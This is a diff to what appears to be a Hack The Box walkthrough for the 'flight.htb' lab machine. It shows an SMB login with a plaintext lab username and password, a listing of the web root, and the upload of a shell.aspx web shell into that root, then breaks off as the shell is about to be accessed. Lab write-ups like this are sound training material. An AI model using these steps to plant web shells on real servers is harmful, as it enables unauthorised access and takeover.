@@ -514,5 +514,33 @@ This generate me a rev shell
 ```
 
 ```python
+smbclient //g0.flight.htb/Web -U 'c.bum'%'Tikkycoll_431012284'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Apr  1 00:57:00 2026
+  ..                                  D        0  Wed Apr  1 00:57:00 2026
+  flight.htb                          D        0  Wed Apr  1 00:57:00 2026
+  school.flight.htb                   D        0  Wed Apr  1 00:57:00 2026
+
+		5056511 blocks of size 4096. 1246223 blocks available
+smb: \> cd flight.htb\
+smb: \flight.htb\> ls
+  .                                   D        0  Wed Apr  1 00:57:00 2026
+  ..                                  D        0  Wed Apr  1 00:57:00 2026
+  css                                 D        0  Wed Apr  1 00:57:00 2026
+  images                              D        0  Wed Apr  1 00:57:00 2026
+  index.html                          A     7069  Thu Feb 24 05:58:10 2022
+  js                                  D        0  Wed Apr  1 00:57:00 2026
+
+		5056511 blocks of size 4096. 1246207 blocks available
+smb: \flight.htb\> put shell.aspx
+putting file shell.aspx as \flight.htb\shell.aspx (75.2 kB/s) (average 75.2 kB/s)
+smb: \flight.htb\> 
+```
+This planted the shell at the root of `http://flight.htb/`
+
+Now if i access `http://flight.htb/shell.aspx`
+
+```python
 
 ```
